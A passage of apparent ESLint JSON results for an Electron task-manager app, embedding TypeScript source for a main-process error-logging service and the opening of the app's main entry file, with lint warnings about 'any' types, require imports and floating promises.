*/\n\nimport { ipcMain, app, BrowserWindow } from 'electron';\nimport * as path from 'path';\nimport * as fs from 'fs';\nimport * as os from 'os';\n\n// Configuration for main process error reporting\nexport interface MainErrorReportingConfig {\n  enabled: boolean;\n  logToFile: boolean;\n  logFilePath?: string;\n  maxLogFileSize: number; // bytes\n  maxLogFiles: number;\n  enableIpcBridge: boolean;\n  enableCrashReporting: boolean;\n  reportToRenderer: boolean;\n  environment: string;\n}\n\n// Error data structure for main process\nexport interface MainProcessError {\n  id: string;\n  timestamp: Date;\n  message: string;\n  stack?: string;\n  type: 'uncaught_exception' | 'unhandled_rejection' | 'electron_error' | 'ipc_error';\n  processType: 'main';\n  context: {\n    platform: string;\n    arch: string;\n    electronVersion: string;\n    nodeVersion: string;\n    appVersion: string;\n    workingDirectory: string;\n    commandLine: string[];\n    memoryUsage: NodeJS.MemoryUsage;\n    [key: string]: any;\n  };\n}\n\n// IPC message structure for renderer communication\nexport interface IPCErrorMessage {\n  type: 'error_report' | 'telemetry_data' | 'status_request';\n  payload: any;\n  timestamp: number;\n  id: string;\n}\n\n/**\n * Main Process Error Reporting Service\n */\nexport class MainProcessErrorReporting {\n  private config: MainErrorReportingConfig = {\n    enabled: true,\n    logToFile: true,\n    maxLogFileSize: 10 * 1024 * 1024, // 10MB\n    maxLogFiles: 5,\n    enableIpcBridge: true,\n    enableCrashReporting: true,\n    reportToRenderer: true,\n    environment: 'development'\n  };\n\n  private isInitialized = false;\n  private logFilePath?: string;\n  private errorCount = 0;\n  private rendererErrors: any[] = [];\n\n  constructor() {\n    // Set up default log path\n    this.logFilePath = path.join(app.getPath('logs'), 'taskmaster-main-errors.log');\n  }\n\n  /**\n   * Initialize main process error reporting\n   */\n  async initialize(config: Partial<MainErrorReportingConfig> = {}): Promise<void> {\n    this.config = { ...this.config, ...config };\n\n    if (!this.config.enabled) {\n      console.log('Main process error reporting disabled');\n      return;\n    }\n\n    try {\n      // Set up log file if enabled\n      if (this.config.logToFile) {\n        await this.setupLogFile();\n      }\n\n      // Set up global error handlers\n      this.setupGlobalErrorHandlers();\n\n      // Set up IPC handlers\n      if (this.config.enableIpcBridge) {\n        this.setupIpcHandlers();\n      }\n\n      // Set up crash reporting\n      if (this.config.enableCrashReporting) {\n        this.setupCrashReporting();\n      }\n\n      this.isInitialized = true;\n      \n      const initMessage = 'Main process error reporting initialized';\n\n      await this.logMessage('info', initMessage);\n      console.log('âœ… Main process error reporting initialized');\n\n    } catch (error) {\n      console.error('âŒ Failed to initialize main process error reporting:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Set up log file with rotation\n   */\n  private async setupLogFile(): Promise<void> {\n    if (!this.config.logFilePath && !this.logFilePath) {\n      throw new Error('No log file path specified');\n    }\n\n    const logPath = this.config.logFilePath || this.logFilePath!;\n    const logDir = path.dirname(logPath);\n\n    // Ensure log directory exists\n    await fs.promises.mkdir(logDir, { recursive: true });\n\n    // Rotate log files if current file is too large\n    await this.rotateLogFiles(logPath);\n\n    this.logFilePath = logPath;\n    console.log(`ðŸ“ Main process error logging to: ${logPath}`);\n  }\n\n  /**\n   * Rotate log files when they get too large\n   */\n  private async rotateLogFiles(logPath: string): Promise<void> {\n    try {\n      const stats = await fs.promises.stat(logPath);\n      \n      if (stats.size > this.config.maxLogFileSize) {\n        // Move current log to backup\n        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');\n        const backupPath = logPath.replace('.log', `-${timestamp}.log`);\n        \n        await fs.promises.rename(logPath, backupPath);\n        \n        // Clean up old backup files\n        await this.cleanupOldLogFiles(path.dirname(logPath));\n      }\n    } catch {\n      // File doesn't exist or can't be read, that's fine\n    }\n  }\n\n  /**\n   * Clean up old log files\n   */\n  private async cleanupOldLogFiles(logDir: string): Promise<void> {\n    try {\n      const files = await fs.promises.readdir(logDir);\n      const logFiles = files.filter(file => file.includes('taskmaster-main-errors'))\n                           .map(file => ({\n                             name: file,\n                             path: path.join(logDir, file),\n                             mtime: fs.statSync(path.join(logDir, file)).mtime\n                           }))\n                           .sort((a, b) => b.mtime.getTime() - a.mtime.getTime());\n\n      // Keep only the most recent files\n      const filesToDelete = logFiles.slice(this.config.maxLogFiles);\n      \n      for (const file of filesToDelete) {\n        await fs.promises.unlink(file.path);\n        console.log(`ðŸ—‘ï¸ Cleaned up old log file: ${file.name}`);\n      }\n    } catch (error) {\n      console.warn('Failed to clean up old log files:', error);\n    }\n  }\n\n  /**\n   * Set up global error handlers for main process\n   */\n  private setupGlobalErrorHandlers(): void {\n    // Handle uncaught exceptions\n    process.on('uncaughtException', (error) => {\n      this.handleMainProcessError(error, 'uncaught_exception', {\n        fatal: true,\n        reason: 'Uncaught exception in main process'\n      });\n    });\n\n    // Handle unhandled promise rejections\n    process.on('unhandledRejection', (reason, promise) => {\n      const error = reason instanceof Error ? reason : new Error(String(reason));\n      this.handleMainProcessError(error, 'unhandled_rejection', {\n        fatal: false,\n        reason: 'Unhandled promise rejection in main process',\n        promise: promise.toString()\n      });\n    });\n\n    // Handle app crashes using modern Electron APIs\n    app.on('child-process-gone', (_event, details) => {\n      const error = new Error(`${details.type} process crashed`);\n      this.handleMainProcessError(error, 'electron_error', {\n        event: 'child-process-gone',\n        type: details.type,\n        reason: details.reason,\n        exitCode: details.exitCode,\n        fatal: false\n      });\n    });\n\n    app.on('render-process-gone', (_event, webContents, details) => {\n      const error = new Error('Renderer process crashed');\n      this.handleMainProcessError(error, 'electron_error', {\n        event: 'render-process-gone',\n        webContentsId: webContents.id,\n        reason: details.reason,\n        exitCode: details.exitCode,\n        fatal: false\n      });\n    });\n\n    app.on('child-process-gone', (_event, details) => {\n      const error = new Error(`Child process gone: ${details.type}`);\n      this.handleMainProcessError(error, 'electron_error', {\n        event: 'child-process-gone',\n        details,\n        fatal: false\n      });\n    });\n\n    console.log('ðŸ›¡ï¸ Main process error handlers set up');\n  }\n\n  /**\n   * Set up IPC handlers for renderer communication\n   */\n  private setupIpcHandlers(): void {\n    // Handle error reports from renderer\n    ipcMain.handle('error-reporting:report', async (_event, errorData) => {\n      return this.handleRendererError(errorData);\n    });\n\n    // Handle telemetry data from renderer\n    ipcMain.handle('error-reporting:telemetry', async (_event, telemetryData) => {\n      return this.handleRendererTelemetry(telemetryData);\n    });\n\n    // Handle status requests\n    ipcMain.handle('error-reporting:status', async () => {\n      return this.getStatus();\n    });\n\n    // Handle log message requests\n    ipcMain.handle('error-reporting:log', async (_event, level, message, context) => {\n      return this.logMessage(level, message, context);\n    });\n\n    console.log('ðŸ”— IPC handlers set up for error reporting');\n  }\n\n  /**\n   * Set up crash reporting\n   */\n  private setupCrashReporting(): void {\n    // Set up crash dumps directory\n    const crashesDirectory = path.join(app.getPath('crashDumps'), 'taskmaster-crashes');\n    \n    try {\n      fs.mkdirSync(crashesDirectory, { recursive: true });\n      console.log(`ðŸ’¥ Crash reporting enabled, dumps in: ${crashesDirectory}`);\n    } catch (error) {\n      console.warn('Failed to set up crash reporting directory:', error);\n    }\n  }\n\n  /**\n   * Handle main process errors\n   */\n  private async handleMainProcessError(\n    error: Error, \n    type: MainProcessError['type'], \n    additionalContext: Record<string, any> = {}\n  ): Promise<void> {\n    this.errorCount++;\n\n    const errorData: MainProcessError = {\n      id: this.generateErrorId(),\n      timestamp: new Date(),\n      message: error.message,\n      stack: error.stack,\n      type,\n      processType: 'main',\n      context: {\n        platform: os.platform(),\n        arch: os.arch(),\n        electronVersion: process.versions.electron || 'unknown',\n        nodeVersion: process.version,\n        appVersion: app.getVersion(),\n        workingDirectory: process.cwd(),\n        commandLine: process.argv,\n        memoryUsage: process.memoryUsage(),\n        ...additionalContext\n      }\n    };\n\n    // Log the error\n    await this.logMessage('error', 'Main process error occurred', errorData);\n\n    // Report to renderer if enabled and windows are available\n    if (this.config.reportToRenderer) {\n      this.reportToRenderer('main_process_error', errorData);\n    }\n\n    // Console output\n    console.error('ðŸ”´ Main Process Error:', {\n      type,\n      message: error.message,\n      stack: error.stack,\n      context: additionalContext\n    });\n\n    // Exit on fatal errors (uncaught exceptions)\n    if (type === 'uncaught_exception') {\n      console.error('ðŸ’€ Fatal error in main process, exiting...');\n      \n      // Give some time for logging and reporting\n      setTimeout(() => {\n        app.exit(1);\n      }, 1000);\n    }\n  }\n\n  /**\n   * Handle errors reported from renderer process\n   */\n  private async handleRendererError(errorData: any): Promise<boolean> {\n    try {\n      this.rendererErrors.push({\n        ...errorData,\n        receivedAt: new Date(),\n        processType: 'renderer'\n      });\n\n      // Keep only recent renderer errors\n      if (this.rendererErrors.length > 100) {\n        this.rendererErrors = this.rendererErrors.slice(-100);\n      }\n\n      await this.logMessage('error', 'Renderer error received', {\n        errorId: errorData.id,\n        message: errorData.message,\n        severity: errorData.severity,\n        tags: errorData.tags\n      });\n\n      return true;\n    } catch (error) {\n      console.error('Failed to handle renderer error:', error);\n      return false;\n    }\n  }\n\n  /**\n   * Handle telemetry data from renderer process\n   */\n  private async handleRendererTelemetry(telemetryData: any): Promise<boolean> {\n    try {\n      await this.logMessage('info', 'Telemetry data received', {\n        type: telemetryData.type,\n        sessionId: telemetryData.sessionId,\n        dataPoints: Array.isArray(telemetryData.data) ? telemetryData.data.length : 1\n      });\n\n      return true;\n    } catch (error) {\n      console.error('Failed to handle renderer telemetry:', error);\n      return false;\n    }\n  }\n\n  /**\n   * Report data to renderer processes\n   */\n  private reportToRenderer(type: string, data: any): void {\n    const message: IPCErrorMessage = {\n      type: type as any,\n      payload: data,\n      timestamp: Date.now(),\n      id: this.generateErrorId()\n    };\n\n    // Send to all renderer processes\n    BrowserWindow.getAllWindows().forEach((window) => {\n      if (!window.isDestroyed()) {\n        window.webContents.send('main-error-report', message);\n      }\n    });\n  }\n\n  /**\n   * Log message to file and console\n   */\n  private async logMessage(level: 'info' | 'warn' | 'error', message: string, context?: any): Promise<void> {\n    const logEntry = {\n      timestamp: new Date().toISOString(),\n      level,\n      message,\n      context,\n      pid: process.pid,\n      memory: process.memoryUsage()\n    };\n\n    const logLine = JSON.stringify(logEntry) + '\\n';\n\n    // Write to file if enabled\n    if (this.config.logToFile && this.logFilePath) {\n      try {\n        await fs.promises.appendFile(this.logFilePath, logLine);\n      } catch (error) {\n        console.error('Failed to write to log file:', error);\n      }\n    }\n\n    // Console output in development\n    if (this.config.environment === 'development') {\n      const consoleMethod = level === 'error' ? console.error : level === 'warn' ? console.warn : console.log;\n      consoleMethod(`[${level.toUpperCase()}] ${message}`, context || '');\n    }\n  }\n\n  /**\n   * Get current status\n   */\n  getStatus() {\n    return {\n      isInitialized: this.isInitialized,\n      errorCount: this.errorCount,\n      rendererErrorCount: this.rendererErrors.length,\n      logFilePath: this.logFilePath,\n      config: this.config,\n      systemInfo: {\n        platform: os.platform(),\n        arch: os.arch(),\n        nodeVersion: process.version,\n        electronVersion: process.versions.electron,\n        appVersion: app.getVersion(),\n        memoryUsage: process.memoryUsage()\n      }\n    };\n  }\n\n  /**\n   * Get recent renderer errors for debugging\n   */\n  getRendererErrors(): any[] {\n    return [...this.rendererErrors];\n  }\n\n  /**\n   * Clear renderer error history\n   */\n  clearRendererErrors(): void {\n    this.rendererErrors = [];\n  }\n\n  /**\n   * Generate unique error ID\n   */\n  private generateErrorId(): string {\n    return `main_error_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n  }\n\n  /**\n   * Cleanup and stop error reporting\n   */\n  destroy(): void {\n    // Remove process listeners\n    process.removeAllListeners('uncaughtException');\n    process.removeAllListeners('unhandledRejection');\n\n    // Remove IPC handlers\n    if (this.config.enableIpcBridge) {\n      ipcMain.removeHandler('error-reporting:report');\n      ipcMain.removeHandler('error-reporting:telemetry');\n      ipcMain.removeHandler('error-reporting:status');\n      ipcMain.removeHandler('error-reporting:log');\n    }\n\n    this.isInitialized = false;\n    console.log('ðŸ›¡ï¸ Main process error reporting destroyed');\n  }\n}\n\n// Global instance for main process\nexport const mainProcessErrorReporting = new MainProcessErrorReporting();\n\n// Types are already exported above with their interface declarations","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/index.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":46,"column":61,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":46,"endColumn":64,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1683,1686],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1683,1686],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":63,"column":62,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":63,"endColumn":65,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2187,2190],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2187,2190],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-require-imports","severity":2,"message":"A `require()` style import is forbidden.","line":193,"column":32,"nodeType":"CallExpression","messageId":"noRequireImports","endLine":193,"endColumn":51},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":205,"column":9,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":207,"endColumn":12,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[7399,7399],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[7399,7399],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":234,"column":14,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":234,"endColumn":17,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8447,8450],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8447,8450],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-require-imports","severity":2,"message":"A `require()` style import is forbidden.","line":238,"column":22,"nodeType":"CallExpression","messageId":"noRequireImports","endLine":238,"endColumn":41},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":326,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":326,"endColumn":38,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[11576,11576],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[11576,11576],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":345,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":345,"endColumn":34,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[12268,12268],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[12268,12268],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":363,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":363,"endColumn":36,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[12842,12842],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[12842,12842],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":387,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":387,"endColumn":46,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[13449,13449],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[13449,13449],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":453,"column":5,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":453,"endColumn":29,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[16173,16173],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[16173,16173],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":464,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":464,"endColumn":41,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[16610,16610],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[16610,16610],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":470,"column":5,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":470,"endColumn":29,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[16806,16806],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[16806,16806],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":545,"column":5,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":554,"endColumn":8,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[19879,19879],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[19879,19879],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":572,"column":39,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":572,"endColumn":42,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[20891,20894],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[20891,20894],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":573,"column":18,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":573,"endColumn":21,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[20940,20943],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[20940,20943],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":592,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":592,"endColumn":51,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[21619,21619],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[21619,21619],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":667,"column":1,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":690,"endColumn":4,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[23622,23622],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[23622,23622],"text":"await "},"desc":"Add await operator."}]}],"suppressedMessages":[],"errorCount":13,"fatalErrorCount":0,"warningCount":5,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { app, BrowserWindow, ipcMain, dialog, shell } from 'electron';\nimport { autoUpdater } from 'electron-updater';\nimport log from 'electron-log';\nimport * as path from 'path';\nimport * as fs from 'fs';\nimport { fileURLToPath } from 'url';\n\n/// <reference path=\"./vite-env.d.ts\" />\n\n// ESM compatibility: Replace __dirname with import.meta.url\nconst __filename = fileURLToPath(import.meta.url);\nconst __dirname = path.dirname(__filename);\n\n// ============================================\n// ðŸš¨ AGGRESSIVE DEBUG LOGGING - 2025 EDITION ðŸš¨\n// ============================================\n\n// Configure electron-log for comprehensive logging\nlog.transports.file.level = 'info';\nlog.transports.console.level = 'info';\nlog.transports.file.maxSize = 5 * 1024 * 1024; // 5MB\n// Use the new API to avoid deprecation warning\nlog.transports.file.archiveLogFn = (oldLogFile) => {\n  // Use process.stdout to avoid infinite recursion since console is overridden below\n  process.stdout.write(`[TASKMASTER] Archived log: ${oldLogFile.toString()}\\n`);\n};\n\n// Override console methods to also log to file\nObject.assign(console, log.functions);\n\nconst _DEBUG_MODE = true;\nconst _DEBUG_PREFIX = 'ðŸ” [TASKMASTER DEBUG]';\nconst ERROR_PREFIX = 'âŒ [TASKMASTER ERROR]';\nconst SUCCESS_PREFIX = 'âœ… [TASKMASTER SUCCESS]';\nconst _WARNING_PREFIX = 'âš ï¸  [TASKMASTER WARNING]';\nconst INFO_PREFIX = 'â„¹ï¸  [TASKMASTER INFO]';\n\n// Performance timing\nconst _startTime = Date.now();\nconst timingLog = (message: string) => {\n  const elapsed = Date.now() - _startTime;\n  console.log(`â±ï¸  [${elapsed}ms] ${message}`);\n};\n\n// Enhanced logging with stack traces\nconst debugLog = (category: string, message: string, data?: any) => {\n  if (!_DEBUG_MODE) return;\n  \n  const timestamp = new Date().toISOString();\n  const stack = new Error().stack?.split('\\n')[2]?.trim() || 'unknown';\n  \n  console.log(`\\n${_DEBUG_PREFIX} [${timestamp}]`);\n  console.log(`ðŸ“ Category: ${category}`);\n  console.log(`ðŸ’¬ Message: ${message}`);\n  console.log(`ðŸ“ Location: ${stack}`);\n  \n  if (data !== undefined) {\n    console.log(`ðŸ“Š Data:`, data);\n  }\n  console.log('â”€'.repeat(80));\n};\n\nconst errorLog = (category: string, message: string, error?: any) => {\n  const timestamp = new Date().toISOString();\n  console.error(`\\n${ERROR_PREFIX} [${timestamp}]`);\n  console.error(`ðŸ“ Category: ${category}`);\n  console.error(`ðŸ’¥ Error: ${message}`);\n  \n  if (error) {\n    console.error(`ðŸ”´ Error Object:`, error);\n    if (error.stack) {\n      console.error(`ðŸ“š Stack Trace:\\n${error.stack}`);\n    }\n  }\n  console.error('â•'.repeat(80));\n};\n\n// Log initial environment\nconsole.log('\\n' + '='.repeat(80));\nconsole.log('ðŸš€ TASKMASTER ELECTRON APP STARTING - DEBUG MODE ENABLED ðŸš€');\nconsole.log('='.repeat(80));\n\ndebugLog('ENVIRONMENT', 'Initial Environment Check', {\n  nodeVersion: process.versions.node,\n  electronVersion: process.versions.electron,\n  chromeVersion: process.versions.chrome,\n  v8Version: process.versions.v8,\n  platform: process.platform,\n  arch: process.arch,\n  cwd: process.cwd(),\n  __dirname,\n  __filename,\n  execPath: process.execPath,\n  resourcesPath: process.resourcesPath,\n  isPackaged: app.isPackaged,\n  appPath: app.getAppPath(),\n  userData: app.getPath('userData'),\n  NODE_ENV: process.env.NODE_ENV,\n  ELECTRON_IS_DEV: process.env.ELECTRON_IS_DEV,\n});\n\n// electron-vite handles development/production URLs automatically\n\n// File existence checker\nconst checkFileExists = (filePath: string, description: string): boolean => {\n  try {\n    const exists = fs.existsSync(filePath);\n    const stats = exists ? fs.statSync(filePath) : null;\n    \n    if (exists) {\n      console.log(`${SUCCESS_PREFIX} ${description}: ${filePath}`);\n      console.log(`  ðŸ“ Size: ${stats?.size} bytes`);\n      console.log(`  ðŸ“… Modified: ${stats?.mtime}`);\n    } else {\n      console.error(`${ERROR_PREFIX} ${description} NOT FOUND: ${filePath}`);\n    }\n    \n    return exists;\n  } catch (error) {\n    errorLog('FILE_CHECK', `Error checking ${description}`, error);\n    return false;\n  }\n};\n\n// Check critical paths at startup\ntimingLog('Checking critical file paths...');\nconst criticalPaths = {\n  mainScript: path.join(__dirname, 'index.js'),\n  preloadDev: path.join(__dirname, '../preload/index.js'),\n  preloadProd: path.join(__dirname, '../preload/index.cjs'),\n  rendererDev: 'http://localhost:5173',\n  rendererProd: path.join(__dirname, '../renderer/index.html'),\n  rendererProdAlt: path.join(__dirname, '../renderer/index.html'),\n};\n\ndebugLog('PATH_CHECK', 'Checking critical paths', criticalPaths);\n\n// Check which files actually exist\ncheckFileExists(criticalPaths.mainScript, 'Main Script');\ncheckFileExists(criticalPaths.preloadDev, 'Preload (Dev Path)');\ncheckFileExists(criticalPaths.preloadProd, 'Preload (Prod Path)');\ncheckFileExists(criticalPaths.rendererProd, 'Renderer HTML (Prod Path)');\ncheckFileExists(criticalPaths.rendererProdAlt, 'Renderer HTML (Alt Path)');\n\n// 2025 Security Best Practices - Electron Forge Fuses Configuration\n// Security fuses are configured in forge.config.js:\n// - RunAsNode: false (prevents Node.js execution in renderer)\n// - EnableCookieEncryption: true (encrypts cookies)\n// - EnableNodeOptionsEnvironmentVariable: false (prevents Node options injection)\n// - EnableNodeCliInspectArguments: false (prevents debug inspection)\n// - EnableEmbeddedAsarIntegrityValidation: true (validates ASAR integrity)\n// - OnlyLoadAppFromAsar: true (only loads app from ASAR package)\n\n// ============================================\n// ðŸš¨ GLOBAL ERROR HANDLERS - CATCH EVERYTHING ðŸš¨\n// ============================================\n\nprocess.on('uncaughtException', (error) => {\n  console.error('\\n' + 'ðŸ’¥'.repeat(40));\n  console.error('ðŸ’¥ UNCAUGHT EXCEPTION IN MAIN PROCESS ðŸ’¥');\n  console.error('ðŸ’¥'.repeat(40));\n  console.error('Error:', error);\n  console.error('Stack:', error.stack);\n  console.error('ðŸ’¥'.repeat(40) + '\\n');\n  \n  // Show error dialog\n  dialog.showErrorBox('Uncaught Exception', \n    `An unexpected error occurred:\\n\\n${error.message}\\n\\nThe application may be unstable.`);\n});\n\nprocess.on('unhandledRejection', (reason, promise) => {\n  console.error('\\n' + 'âš¡'.repeat(40));\n  console.error('âš¡ UNHANDLED PROMISE REJECTION IN MAIN PROCESS âš¡');\n  console.error('âš¡'.repeat(40));\n  console.error('Reason:', reason);\n  console.error('Promise:', promise);\n  console.error('âš¡'.repeat(40) + '\\n');\n});\n\n// ============================================\n// ðŸ”¥ Hot Reloading Development Utilities - 2025 Best Practices ðŸ”¥\n// ============================================\n\n// Enhanced development logging for hot reloading\nif (!app.isPackaged) {\n  console.log('\\n' + 'ðŸ”¥'.repeat(60));\n  console.log('ðŸ”¥ HOT RELOADING DEVELOPMENT MODE ACTIVE ðŸ”¥');\n  console.log('ðŸ”¥'.repeat(60));\n  \n  // Add keyboard shortcuts for development\n  const addDevelopmentShortcuts = (window: BrowserWindow) => {\n    // Register global shortcuts for development\n    const { globalShortcut } = require('electron');\n    \n    try {\n      // Ctrl+R / Cmd+R: Reload renderer\n      globalShortcut.register('CmdOrCtrl+R', () => {\n        debugLog('DEV_SHORTCUT', 'Manual renderer reload triggered');\n        window.webContents.reload();\n      });\n      \n      // Ctrl+Shift+R / Cmd+Shift+R: Hard reload (clear cache)\n      globalShortcut.register('CmdOrCtrl+Shift+R', () => {\n        debugLog('DEV_SHORTCUT', 'Hard reload triggered (clearing cache)');\n        window.webContents.session.clearCache().then(() => {\n          window.webContents.reload();\n        });\n      });\n      \n      // F5: Alternative reload\n      globalShortcut.register('F5', () => {\n        debugLog('DEV_SHORTCUT', 'F5 reload triggered');\n        window.webContents.reload();\n      });\n      \n      // Ctrl+Shift+I / Cmd+Shift+I: Toggle DevTools\n      globalShortcut.register('CmdOrCtrl+Shift+I', () => {\n        debugLog('DEV_SHORTCUT', 'DevTools toggle triggered');\n        window.webContents.toggleDevTools();\n      });\n      \n      console.log(`${SUCCESS_PREFIX} Development shortcuts registered:`);\n      console.log('  ðŸ”„ Ctrl/Cmd+R: Reload renderer');\n      console.log('  ðŸ”„ Ctrl/Cmd+Shift+R: Hard reload (clear cache)');\n      console.log('  ðŸ”„ F5: Alternative reload');\n      console.log('  ðŸ”§ Ctrl/Cmd+Shift+I: Toggle DevTools');\n      \n    } catch (error) {\n      errorLog('DEV_SHORTCUTS', 'Failed to register development shortcuts', error);\n    }\n  };\n  \n  // Export the function to be used in createWindow\n  (global as any).addDevelopmentShortcuts = addDevelopmentShortcuts;\n  \n  // Hot reload monitoring\n  const setupHotReloadMonitoring = () => {\n    const chokidar = require('chokidar');\n    \n    // Watch for main process file changes (electron-vite handles this but add extra logging)\n    const mainWatcher = chokidar.watch([\n      path.join(__dirname, '../**/*.{js,ts,mjs,cjs}'),\n      path.join(__dirname, '../../src/main/**/*.{js,ts}'),\n      path.join(__dirname, '../../src/preload/**/*.{js,ts}')\n    ], {\n      ignored: [\n        '**/node_modules/**',\n        '**/dist/**',\n        '**/out/**',\n        '**/.git/**'\n      ],\n      ignoreInitial: true\n    });\n    \n    mainWatcher.on('change', (filePath: string) => {\n      